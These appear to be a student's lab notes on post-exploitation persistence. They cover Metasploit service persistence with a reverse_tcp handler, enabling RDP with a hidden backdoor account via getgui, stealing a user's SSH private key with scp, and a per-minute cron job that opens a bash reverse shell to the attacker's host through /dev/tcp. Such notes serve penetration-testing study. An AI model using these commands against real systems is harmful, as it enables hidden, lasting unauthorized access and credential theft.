
Persistence is techniques to keep access when access is cut off
Gaining initial foothold is not enough, you need to setup and maintain persistent access to your target. 


#### Windows Persistence

##### Persistence via Services 

- identify vulnerable system you can exploit on target system 

After getting initial foothold and a meterpreter session search for **persistence_service** 

in msfconsole: 
- ``use persistence service`` (you need admin credentials for this module)
- change ``lport`` 
- in real life scenario change the service name to make sure that it blends in. 
- ``kill`` the sessions (no more sessions on target)

how to regain access with persistence? 
- restart msfconsole 
- use ``multi/handler ``
- set payload windows/meterpreter/reverse_tcp 
- set ``lhost`` and ``lport`` 
- exploit 

every time you run the handler the session is created. 



##### Persistence via RDP 

badblue_ext_overflow 
- identify vulnerable system on target 
- migrate to stable process in meterpreter 

Gain persistence: 
1. ``run getgui -e -u hacker -p hacked_123321 ``
	- getgui will check if RDP is enabled if not it will enable it and, add a user and hide it from login screen 
	- this command also provides a resource script to clean up

utilize rdp client to connect to new account created: 
- ``xfreerdp /u:hacker /p:hacked123321 /v:target_ip ``

login on screen with new credentials and open cmd (run as administrator): ``whoami /priv ``
``net user ``




#### Linux Persistence

##### Persistence via SSH keys

- Linux is deployed as a server operating system (to host applications) and as a result linux servers typically accessed remotely via services/protocol's such as ssh. 
- if ssh is enabled and running on a linux system you have compromised, you can take advantage of the ssh configuration to establish persistent access on the target system. 
- in most cases linux servers will have key-based authentication enabled for the ssh service, allowing users to access the linux system remotely without the need for password 
- After gaining access to a linux system, we can transfer the ssh private key of a specific user account to our system and use that ssh private key for all future authentication and access. 




ssh student@target_ip 
password: password 

- login into compromised account with ssh:  student@target_ip 
- ls -al 

we have two interesting folders: .ssh folder and a binary folder called wait. 
- cat wait  (when you are done delete the wait binary)
- cd .ssh/  (here we will find the private key, (generated with sshgn)), cat the content of the private key
- cat the other content in the ssh file 
- in your kali terminal: copy id_rsa onto our system with ``scp`` which will allow us to download a file from the target system to our kali system, via ssh: ``scp student@target_ip:~/file_you_want_to_download location_file ``
			 - ``~/.ssh/id_rsa .``  (the ``.`` means you want to copy it to the directory you currently in)

- give the id_rsa file the permissions that typically associated with private keys : ``chmod 400 id_rsa ``

Log back into the system with ssh and compromised account (for simulation purpose do not do this in pentest)
- when you are SUPER SURE that you downloaded the rsa key you remove the wait file: ``rm wait `` which will reset the connection. 

Even when the user changes the password, we can still login using the **rsa private key.** 
- ``ssh  -i name_privatekey_file user@target_ip ``










##### persistence via Cron Jobs 

- Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule
- An application or script that has been configured to be run repeatedly with Cron is known as a Cron job. 
- We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system. 
- anatomy of a cron job: ![[Pasted image 20230925152000.png]]
first 5 fields are used to specify the time and date 

- log onto system with compromised user credentials using ssh: ``ssh user_name@target_ip ``
- One we set up our crownjob we remove the binary wait to reset and simulate what would happen if the users password would change, taking away our accesspoint. 
- ``cat /etc/cron ``  or crontac 
- create cronjob that runs every minute of the day,month,year : 
  ``echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/kali_ip/port_netcat_listernet 0>&1'" > cron``
  

    - `/bin/bash -c`: This part specifies the shell to use, in this case, `/bin/bash`, and the `-c` option indicates that the following command should be executed by the shell.
        
    - `'bash -i >& /dev/tcp/kali_ip/port_netcat_listner 0>&1'`: This part is the actual command to run. It executes `/bin/bash` with the `-i` option, which stands for "interactive." This means it opens an interactive shell session. The `>& /dev/tcp/kali_ip/port_netcat_listernet` part is a redirection that sends both standard input (`0`) and standard output (`1`) to a network socket specified as `/dev/tcp/kali_ip/port_netcat_listernet`.
  
- ``cat cron ``
- add the cron job: ``crontab -i cron ``
- ``crontab -l ``

(removing the wait file is for simulation purposes only)

- SET UP NETCAT LISTNER: ``nc -nvlp 1234`` (the port should be the same as specified in cronjob command)

